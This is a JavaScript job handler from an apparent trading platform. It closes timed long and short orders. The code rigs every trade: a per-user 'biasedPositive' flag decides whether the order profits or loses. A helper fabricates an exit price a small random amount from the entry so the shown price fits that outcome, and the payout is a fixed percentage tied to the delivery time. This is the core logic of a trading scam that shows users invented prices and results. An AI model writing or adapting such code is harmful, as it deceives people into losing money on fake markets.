import { ORDER_STATUSES } from '../db/schemas/Order';

function calculateBiasedDeliveryPrice(purchasePrice, currentPrice, isBiasedPositive, orderType) {
    const isLong = orderType === 'long';

    const toDp = (float = 0, dp = 2) => Math.round(float * Math.pow(10, dp)) / Math.pow(10, dp)

    // Round to 2 decimals for comparison
    const roundedPurchase = toDp(purchasePrice, 2);
    const roundedCurrent = toDp(currentPrice, 2);

    // Determine if current price already gives desired outcome
    const currentPnLPositive = isLong ? roundedCurrent > roundedPurchase : roundedCurrent < roundedPurchase;

    // If current price already matches desired bias, use it as-is
    if (currentPnLPositive === isBiasedPositive) {
        console.log(JSON.stringify({
            roundedPurchase,
            roundedCurrent,
            isBiasedPositive,
            orderType,
        }))

        return roundedCurrent;
    }

    const minChange = roundedCurrent > 100 ? 0.1 : 0.01;
    const maxAdd = roundedCurrent > 100 ? 0.6 : 0.06;

    // Small random adjustment;
    const smallAdjustment = Math.max(minChange, toDp((Math.random() * maxAdd + minChange), 2));

    let adjustedPrice;

    if (isBiasedPositive) {
        // Need positive PnL
        if (isLong) {
            // Long needs price > purchase, so increase
            adjustedPrice = roundedPurchase + smallAdjustment;
        } else {
            // Short needs price < purchase, so decrease
            adjustedPrice = roundedPurchase - smallAdjustment;
        }
    } else {
        // Need negative PnL
        if (isLong) {
            // Long needs price < purchase, so decrease
            adjustedPrice = roundedPurchase - smallAdjustment;
        } else {
            // Short needs price > purchase, so increase
            adjustedPrice = roundedPurchase + smallAdjustment;
        }
    }

    const biasedDeliveryPrice = toDp(adjustedPrice, 2);

    console.log(JSON.stringify({
        roundedPurchase,
        roundedCurrent,
        isBiasedPositive,
        orderType,
        smallAdjustment,
        biasedDeliveryPrice
    }))

    return biasedDeliveryPrice;
}

export function defineDeliverOrder(agenda) {
    agenda.define('deliver order', async (job) => {
        const { orderId } = job.attrs.data;

        try {
            console.log(`[Agenda] Closing order: ${orderId}`);
            const Order = getModel('Order');

            const order = await Order.findById(orderId).populate([
                {
                    path: 'pair',
                    select: 'valueUsd baseAsset'
                },
                {
                    path: 'tradingAccount',
                    select: 'user',
                    populate: {
                        path: 'user',
                        select: 'trading.biasedPositive'
                    }
                },
            ]);

            if (!order) {
                console.error(`[Agenda] Order ${orderId} not found`);
                return;
            }

            if (order.status !== ORDER_STATUSES.OPEN) {
                console.log(`[Agenda] Order ${orderId} already ${order.status}`);
                return;
            }

            const isBiasedPositive = order.tradingAccount?.user?.trading?.biasedPositive;
            const currentPrice = order.pair.valueUsd;
            const deliveryPrice = calculateBiasedDeliveryPrice(
                order.purchasePrice,
                currentPrice,
                isBiasedPositive,
                order.type
            );

            const deliveryTime = `${order.deliveryTime.value}${order.deliveryTime.units}`.toLowerCase();

            const deliveryProfitMap = new Map([
                ['30s', 20],
                ['60s', 30],
                ['120s', 40],
                ['1h', 45],
                ['3h', 50],
                ['6h', 55],
                ['12h', 65]
            ]);

            const profitRange = deliveryProfitMap.get(deliveryTime);
            const fixedPnl = parseFloat((order.amountUsdt * profitRange / 100).toFixed(2));

            order.deliveryPrice = deliveryPrice;

            if (deliveryPrice > order.maxPrice) {
                order.maxPrice = deliveryPrice;
            }
            if (deliveryPrice < order.minPrice) {
                order.minPrice = deliveryPrice;
            }

            await order.save();

            const biasedPnL = isBiasedPositive ? fixedPnl : -fixedPnl;

            console.log(`[Agenda] Order ${orderId}: Entry ${order.purchasePrice}, Exit ${deliveryPrice}, PnL: ${biasedPnL.toFixed(2)}`);

            const { profitLoss, isProfit } = await closeOrder(orderId, biasedPnL);

            console.log(`[Agenda] ✅ Order ${orderId} closed. Final PnL: ${profitLoss} (${isProfit ? 'Profit' : 'Loss'})`);

        } catch (error) {
            console.error(`[Agenda] Error closing order ${orderId}:`, error);
            throw error;
        }
    });
}